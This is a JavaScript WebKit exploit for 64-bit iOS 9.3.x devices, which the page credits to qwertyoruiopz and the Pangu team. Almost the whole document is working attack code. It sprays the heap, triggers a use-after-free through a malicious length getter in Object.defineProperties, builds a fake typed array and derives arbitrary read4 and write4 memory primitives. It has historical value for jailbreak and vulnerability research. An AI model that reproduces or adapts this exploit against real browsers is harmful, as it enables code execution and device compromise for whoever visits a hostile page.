
 var mem0 = 0;
 var mem1 = 0;
 var mem2 = 0;

 function read4(addr) {
 	mem0[4] = addr;
 	var ret = mem2[0];
 	mem0[4] = mem1;
 	return ret;
 }

 function write4(addr, val) {
 	mem0[4] = addr;
 	mem2[0] = val;
 	mem0[4] = mem1;
 }

 var print = alert;
 _dview = null;

 function u2d(low, hi) {
 	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
 	_dview.setUint32(0, hi);
 	_dview.setUint32(4, low);
 	return _dview.getFloat64(0);
 }
 var pressure = new Array(100);
 var bufs = new Array(10000);
 dgc = function() {
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x10000);
 	}
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = 0;
 	}
 }

 function swag() {
 	if (bufs[0]) return;
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	for (i = 0; i < bufs.length; i++) {
 		bufs[i] = new Uint32Array(0x100 * 2)
 		for (k = 0; k < bufs[i].length;) {
 			bufs[i][k++] = 0x41414141;
 			bufs[i][k++] = 0xffff0000;
 		}
 	}
 }
 var trycatch = "";
 for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
 var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)


 function go() {
 	document.body.innerHTML = "<center><h1>doing it</h1>by <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a> & <a href='http://pangu.io'>pangu team</a>, for iOS 9.3.x<br />may take multiple tries, 64 bit only<br />tyvm NSO, sick 0day (at the time)</center>";
	dgc();
 	setTimeout(go_, 400);
 }

 function go_() {
 	if (smsh.length != 0x10) {
 		smashed();
 		return;
 	}
 	dgc();
 	var arr = new Array(0x100);
 	var yolo = new ArrayBuffer(0x1000);
 	arr[0] = yolo;
 	arr[1] = 0x13371337;
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
 		props["stale"]["value"] = null;
 		swag();
 		return 10;
 	};
 	var props = {
 		p0: {
 			value: 0
 		},
 		p1: {
 			value: 1
 		},
 		p2: {
 			value: 2
 		},
 		p3: {
 			value: 3
 		},
 		p4: {
 			value: 4
 		},
 		p5: {
 			value: 5
 		},
 		p6: {
 			value: 6
 		},
 		p7: {
 			value: 7
 		},
 		p8: {
 			value: 8
 		},
 		length: {
 			value: not_number
 		},
 		stale: {
 			value: arr
 		},
 		after: {
 			value: 666
 		}
 	};
 	var target = [];
 	var stale = 0;
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
 	stale[0] += 0x101;
 	stale[1] = {}
 	for (var z = 0; z < 0x1000; z++) fc();
 	for (i = 0; i < bufs.length; i++) {
 		for (k = 0; k < bufs[0].length; k++) {
 			if (bufs[i][k] == 0x41414242) {
 				stale[0] = fc;
 				fcp = bufs[i][k];
 				stale[0] = {
 					'a': u2d(105, 0x1172600),
 					'b': u2d(0, 0),
 					'c': smsh,
 					'd': u2d(0x100, 0)
 				}
 				stale[1] = stale[0]
 				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
 				stale[0][6] = 0xffffffff;
 				mem0 = stale[0];
 				mem1 = bck;
 				mem2 = smsh;
 				bufs.push(stale)
 				if (smsh.length != 0x10) {
 					
 				}
 				return;
 			}
 		}
 	}
 	document.location.reload();
 }
